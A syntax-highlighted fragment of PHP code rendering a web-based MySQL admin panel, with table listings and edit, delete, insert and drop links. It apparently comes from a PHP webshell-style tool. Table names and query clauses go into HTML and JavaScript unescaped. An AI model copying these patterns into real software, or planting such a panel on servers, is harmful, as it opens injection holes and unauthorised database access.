<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">allowedit</span>) <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td nowrap&gt;&lt;a href="j</span><span style="color: #70c0b1; text-decoration: underline;">avascript:editrecord(\'edit\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">where</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\');"&gt;Edit&lt;/a&gt; | &lt;a href="javascript:editrecord(\'del\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">where</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\', \''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">tablename</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\');"&gt;Del&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span>$<span style="color: #e7c547;">b1</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/tr&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">unset(</span>$<span style="color: #e7c547;">b1</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">allowedit</span>) <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Action&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">fieldnum</span> = @<span style="color: #eaeaea; background-color: #000000;">mysql_num_fields(</span>$<span style="color: #e7c547;">result</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">for</span>($<span style="color: #e7c547;">i</span>=<span style="color: #eaeaea; background-color: #000000;">0</span>;$<span style="color: #e7c547;">i</span>&lt;$<span style="color: #e7c547;">fieldnum</span>;$<span style="color: #e7c547;">i</span>++){
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">name</span> = @<span style="color: #eaeaea; background-color: #000000;">mysql_field_name(</span>$<span style="color: #e7c547;">result</span>, $<span style="color: #e7c547;">i</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">type</span> = @<span style="color: #eaeaea; background-color: #000000;">mysql_field_type(</span>$<span style="color: #e7c547;">result</span>, $<span style="color: #e7c547;">i</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">len</span> = @<span style="color: #eaeaea; background-color: #000000;">mysql_field_len(</span>$<span style="color: #e7c547;">result</span>, $<span style="color: #e7c547;">i</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">"&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)</span><span style="color: #70c0b1; text-decoration: underline;">"</span><span style="text-decoration: underline;">.(($</span><span style="color: #e7c547; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #e7c547; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #70c0b1; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #70c0b1; text-decoration: underline;">'UNI'</span><span style="text-decoration: underline;"> || $</span><span style="color: #e7c547; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #e7c547; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #70c0b1; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #70c0b1; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) ? </span><span style="color: #70c0b1; text-decoration: underline;">'&lt;b&gt; - PRIMARY&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #70c0b1; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #e7c547; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #e7c547; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #70c0b1; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: #70c0b1; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> ? </span><span style="color: #70c0b1; text-decoration: underline;">'&lt;b&gt; - Auto&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #70c0b1; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #70c0b1; text-decoration: underline;">"&lt;/span&gt;&lt;/td&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/tr&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">tbfoot(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span>$<span style="color: #e7c547;">multipage</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">break</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">case</span> <span style="color: #7aa6da;">2</span>:
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">ar</span> = <span style="color: #eaeaea; background-color: #000000;">mysql_affected_rows(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;h2&gt;affected rows : &lt;b&gt;'</span>.$<span style="color: #e7c547;">ar</span>.<span style="color: #70c0b1;">'&lt;/b&gt;&lt;/h2&gt;'</span>)<span style="text-decoration: underline;">;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">break</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">query</span> = <span style="color: #eaeaea; background-color: #000000;">q(</span><span style="color: #70c0b1;">"SHOW TABLE STATUS"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">table_num</span> = $<span style="color: #e7c547;">table_rows</span> = $<span style="color: #e7c547;">data_size</span> = <span style="color: #eaeaea; background-color: #000000;">0</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">tabledb</span> = <span style="color: #eaeaea; background-color: #000000;">array(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">while</span>($<span style="color: #e7c547;">table</span> = <span style="color: #eaeaea; background-color: #000000;">mysql_fetch_array(</span>$<span style="color: #e7c547;">query</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">data_size</span> = $<span style="color: #e7c547;">data_size</span> + $<span style="color: #e7c547;">table</span>[<span style="color: #70c0b1;">'Data_length'</span>];
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">table_rows</span> = $<span style="color: #e7c547;">table_rows</span> + $<span style="color: #e7c547;">table</span>[<span style="color: #70c0b1;">'Rows'</span>];
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">table</span>[<span style="color: #70c0b1;">'Data_length'</span>] = <span style="color: #eaeaea; background-color: #000000;">sizecount(</span>$<span style="color: #e7c547;">table</span>[<span style="color: #70c0b1;">'Data_length'</span>]);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">table_num</span>++;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">tabledb</span>[] = $<span style="color: #e7c547;">table</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">data_size</span> = <span style="color: #eaeaea; background-color: #000000;">sizecount(</span>$<span style="color: #e7c547;">data_size</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">unset(</span>$<span style="color: #e7c547;">table</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;table border="0" cellpadding="0" cellspacing="0"&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;form action="'</span>.$<span style="color: #e7c547;">self</span>.<span style="color: #70c0b1;">'" method="POST"&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'action'</span>,<span style="color: #70c0b1;">'mysqladmin'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span>$<span style="color: #e7c547;">dbform</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td width="2%" align="center"&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Name&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Rows&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Data_length&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Create_time&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Update_time&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">highver</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Engine&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;Operate&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/tr&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span> ($<span style="color: #e7c547;">tabledb</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">key</span> =&gt; $<span style="color: #e7c547;">table</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">thisbg</span> = <span style="color: #eaeaea; background-color: #000000;">bg(</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;tr class="'</span>.$<span style="color: #e7c547;">thisbg</span>.<span style="color: #70c0b1;">'" onmouseover="this.className=\'foc</span><span style="color: #70c0b1; text-decoration: underline;">us\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td align="center" width="2%"&gt;&lt;input type="checkbox" name</span><span style="color: #70c0b1; text-decoration: underline;">="table[]" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'" /&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;&lt;a href="javascript:settable(\''</span>.$<span style="color: #e7c547;">table</span>[<span style="color: #70c0b1;">'Name'</span>].<span style="color: #70c0b1;">'\');</span><span style="color: #70c0b1; text-decoration: underline;">"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">table</span>[<span style="color: #70c0b1;">'Rows'</span>].<span style="color: #70c0b1;">'&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">table</span>[<span style="color: #70c0b1;">'Data_length'</span>].<span style="color: #70c0b1;">'&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">table</span>[<span style="color: #70c0b1;">'Create_time'</span>].<span style="color: #70c0b1;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">table</span>[<span style="color: #70c0b1;">'Update_time'</span>].<span style="color: #70c0b1;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">highver</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">table</span>[<span style="color: #70c0b1;">'Engine'</span>].<span style="color: #70c0b1;">'&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;'</span>.$<span style="color: #e7c547;">table</span>[<span style="color: #70c0b1;">'Collation'</span>].<span style="color: #70c0b1;">'&lt;/td&gt;'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;td&gt;&lt;a href="javascript:settable(\''</span>.$<span style="color: #e7c547;">table</span>[<span style="color: #70c0b1;">'Name'</span>].<span style="color: #70c0b1;">'\', </span><span style="color: #70c0b1; text-decoration: underline;">\'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #70c0b1; text-decoration: underline;">'\', \'drop\');"&gt;Drop&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">p(</span><span style="color: #70c0b1;">'&lt;/tr&gt;'</span>);
